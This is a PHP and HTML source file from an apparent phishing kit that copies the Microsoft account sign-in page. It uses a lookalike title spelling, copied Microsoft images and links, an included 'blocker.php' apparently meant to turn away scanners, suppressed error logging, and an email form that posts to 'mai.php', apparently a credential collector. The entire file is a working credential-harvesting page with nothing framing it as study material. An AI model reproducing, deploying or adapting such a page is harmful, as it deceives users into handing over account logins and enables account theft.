<? 

include('blocker.php');

error_reporting(0);
ini_set('error_log',NULL);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your M&Icirc;crosoft account</title>
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="naf/inf/Converged_v21033.css">
</head>

<body class="cb">
    <div>
        <div>
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27773.2/images/Backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div>
            
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27773.2/images/Backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div>
            
            </div>
        </div>
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"  action="mai.php">
            <div class="outer">
                <div class="middle">
                    <div class="inner">
                        <div role="banner">
                            <!--  --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27773.2/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27773.2/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="naf/inf/microsoft_logo.svg"> </div>
                        <div role="main">
                            <div>
                                <div data-viewid="1">
                                    <div>
                                        <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1" data-bind="text: title">Sign in</div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="form-group col-md-24">
                                            <div class="placeholderContainer">
				<input name="id" id="i0116" maxlength="113" class="form-control ltr_override"  placeholder="Email, phone, or Skype"  type="email" lang="en" required > 
                                                
                                            </div>
                                    </div>
                                    <div class="position-buttons">
                                        <div>
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <div class="form-group" data-bind="
                        htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                        childBindings: {
                            'signup': {
                                href: svr.e,
                                ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                                click: $usernameView.signup_onClick } }">No account? <a href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1526624083&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3dbcb5f3f6-b97d-ed7b-9df9-8861d8e6ea95&amp;id=292841&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=982B2F78FD1575EA&amp;bk=1526624084&amp;uiflavor=web&amp;uaid=71693e68d6ab4064b6ac1c2f53d534bb&amp;mkt=EN-US&amp;lc=1033" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                                       
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div>
                                                <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
                                                    <div class="inline-block"> <input id="idBtn_Back" class="btn btn-block" value="Back" style="display: none;" type="button"> </div>
                                                    <div class="inline-block"> <input id="idSIButton9" class="btn btn-block btn-primary" value="Next" type="submit"> </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                debugDetails: debugDetails,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                showDebugDetailsClick: footer_showDebugDetailsClick } }">
                    <!--  -->
                    <!-- ko if: showLinks || impressumLink || showIcpLicense -->
                    <div id="footerLinks" class="footerNode text-secondary">
                        <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.bG">©2019 Microsoft</span>
                        <!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; cookies</a>
                        
                        <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><img class="desktopMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27773.2/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://auth.gfx.ms/16.000.27773.2/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="naf/inf/ellipsis_white.svg"><img class="mobileMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27773.2/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://auth.gfx.ms/16.000.27773.2/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="naf/inf/ellipsis_grey.svg">
                        </a>
                    </div>
                </div>
            </div>
        
    </div></form>


</div></body></html>